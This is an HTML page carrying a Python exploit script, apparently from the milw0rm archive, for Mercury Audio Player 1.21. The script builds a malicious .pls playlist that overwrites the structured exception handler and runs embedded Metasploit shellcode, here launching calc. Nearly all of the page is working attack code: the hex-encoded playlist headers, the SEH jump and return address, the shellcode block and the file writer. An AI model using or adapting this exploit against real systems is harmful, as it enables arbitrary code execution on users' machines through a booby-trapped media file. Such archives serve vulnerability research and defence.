<html><head><title>Mercury Audio Player 1.21 (.pls) SEH Overwrite Exploit</title></head><pre>#usage: exploit.py
print &quot;**************************************************************************&quot;
print &quot; Mercury Audio Player 1.21 (.pls) Seh Overwrite Exploit\n&quot;
print &quot; Refer: http://www.milw0rm.com/exploits/8578&quot;
print &quot; Exploit code: His0k4&quot;
print &quot; Tested on: Windows XP Pro SP3 (EN)\n&quot;
print &quot; greetz: TO ELITE ALGERIANS,snakespc.com\n&quot;
print &quot;**************************************************************************&quot;
         	

header1 = (
&quot;\x5b\x50\x6c\x61\x79\x6c\x69\x73\x74\x5d\x0d\x0a\x46\x69\x6c\x65&quot;
&quot;\x31\x3d&quot;)

header2 = (
&quot;\x2e\x6d\x70\x33\x0d\x0a\x54\x69\x74\x6c\x65\x31\x3d\x20\x73\x69&quot;
&quot;\x6c\x65\x6e\x63\x65\x20\x69\x73\x20\x67\x6f\x6c\x64\x0d\x0a\x4e&quot;
&quot;\x75\x6d\x62\x65\x72\x4f\x66\x45\x6e\x74\x72\x69\x65\x73\x3d\x31&quot;
&quot;\x0d\x0a\x56\x65\x72\x73\x69\x6f\x6e\x3d\x32\x0d\x0a&quot;)
			
buff = &quot;\x41&quot; * 31
next_seh = &quot;\xEB\x06\x90\x90&quot;
seh = &quot;\xB8\x15\xD1\x72&quot; #msacm32.drv
junk = &quot;\x41&quot;*3000

# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
shellcode = (
&quot;\x29\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe8&quot;
&quot;\x61\xfb\x36\x83\xeb\xfc\xe2\xf4\x14\x89\xbf\x36\xe8\x61\x70\x73&quot;
&quot;\xd4\xea\x87\x33\x90\x60\x14\xbd\xa7\x79\x70\x69\xc8\x60\x10\x7f&quot;
&quot;\x63\x55\x70\x37\x06\x50\x3b\xaf\x44\xe5\x3b\x42\xef\xa0\x31\x3b&quot;
&quot;\xe9\xa3\x10\xc2\xd3\x35\xdf\x32\x9d\x84\x70\x69\xcc\x60\x10\x50&quot;
&quot;\x63\x6d\xb0\xbd\xb7\x7d\xfa\xdd\x63\x7d\x70\x37\x03\xe8\xa7\x12&quot;
&quot;\xec\xa2\xca\xf6\x8c\xea\xbb\x06\x6d\xa1\x83\x3a\x63\x21\xf7\xbd&quot;
&quot;\x98\x7d\x56\xbd\x80\x69\x10\x3f\x63\xe1\x4b\x36\xe8\x61\x70\x5e&quot;
&quot;\xd4\x3e\xca\xc0\x88\x37\x72\xce\x6b\xa1\x80\x66\x80\x91\x71\x32&quot;
&quot;\xb7\x09\x63\xc8\x62\x6f\xac\xc9\x0f\x02\x9a\x5a\x8b\x61\xfb\x36&quot;)

exploit = header1 + buff + next_seh + seh + shellcode + junk + header2

try:
    out_file = open(&quot;exploit.pls&quot;,'w')
    out_file.write(exploit)
    out_file.close()
    raw_input(&quot;\nExploit file created!\n&quot;)
except:
    print &quot;Error&quot;

# milw0rm.com [2009-04-30]</pre></html>